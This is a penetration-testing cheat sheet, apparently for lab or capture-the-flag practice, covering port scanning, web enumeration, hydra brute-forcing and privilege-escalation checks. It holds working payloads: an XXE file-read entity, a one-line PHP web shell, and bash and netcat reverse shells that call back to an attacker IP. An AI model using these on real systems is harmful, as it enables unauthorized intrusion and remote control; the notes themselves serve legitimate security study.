# Target enumeration

## Remote
1. `nmap <ip> -p-` (all ports) 
    - `-sU` (UDP) `-Pn` (skip host discovery)`
    - `-A` (implies `-O` (OS), `-sC` (scripts), `-sV` (version))
    - `-f` (fragment packets) `-D` (decoy)
2. Webservers
    - Spider website (e.g. using Burp Suite Proxy without intercept)
    - Enumerate subdomains and dirs (e.g. with `gobuster`)
    - Vulnerabilities with OWASP
    - Enumerate login forms
        - `hydra -L <file> -P <file>`
    - XSS, SQL-Injection
    - XXE/XEE
        - `<?xml version = "1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>`
    - Path traversal
        - .htpasswd
        - /etc/passwd
        - /etc/group
3. Monitor TCP/IP traffic (e.g. LDAP) `sudo tcpdump -i tun0 port 389`

## On site
1. Processes
    - `ps aux`
2. Ports
    - `ss`
    - `netstat -tunlp`
        - `-t` (TCP)
        - `-u` (UDP)
        - `-n` (No service resolution)
        - `-l` (Only listening)
        - `-p` (Process info)

    - `lsof`
3. File system
    - Interesting text data
        - `find . -type f -name '<glob pattern>' | xargs cat | grep -i <glob pattern>`
    - .ssh folder
    - Binaries
        - Find binaries with permissions for user group `find / -group <group_name> 2>/dev/null`
        - Query infos about files `ls -la <path_to_file> && file <path_to_file>`
        - Append PATH `export PATH=<directory>:$PATH`
        - Check vulnerable binaries https://gtfobins.github.io/
        - Inspection/Injection: `pwn`, `cutter`, `Ghidra`


# Remote code execution
1. Access OS shell
    - Set up reverse shell with `nc -lvnp <port>`
        - `/usr/share/webshells/php/php-reverse-shell.php`, `<?php echo system($_REQUEST['cmd']);?>`
        - `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`
    - Spawn fully interactive shell
        - `python3 -c 'import pty;pty.spawn("/bin/bash")'` CTRL+Z `stty raw -echo` `fg` `export TERM=xterm`
    - Use ssh if credentials found at some point
    - Windows: use `nc64.exe -e cmd.exe <my ip> <port>`


# Privilege escalation
1. User permissions: `whoami`, `id`, `sudo -l` or Windows `whoami /priv`, `icacls`
2. User groups
    - `lxd`: Containers
3. Windows: `impacket-psexec`


# Password cracking
1. Use Google as Rainbow Table


# Privacy
1. Tails
2. Proxychains with TOR
